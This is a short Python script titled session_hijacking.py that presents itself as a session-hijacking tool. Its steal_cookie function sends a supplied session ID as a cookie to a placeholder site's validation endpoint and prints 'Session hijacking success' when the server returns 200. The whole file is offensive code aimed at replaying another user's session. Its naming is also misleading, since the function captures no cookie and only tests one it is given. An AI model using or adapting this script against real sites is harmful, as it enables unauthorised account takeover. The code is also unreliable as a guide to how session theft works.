# session_hijacking.py
import requests

def steal_cookie(session_id):
    headers = {"Cookie": f"session_id={session_id}"}
    # Assuming a URL endpoint that validates session cookies
    response = requests.get("http://target-site.com/validate_session", headers=headers)
    return response.status_code == 200  # Returns True if session is valid

if __name__ == "__main__":
    # Sample usage
    session_id = "example_session_id"
    is_valid = steal_cookie(session_id)
    print(f"Session hijacking success: {is_valid}")
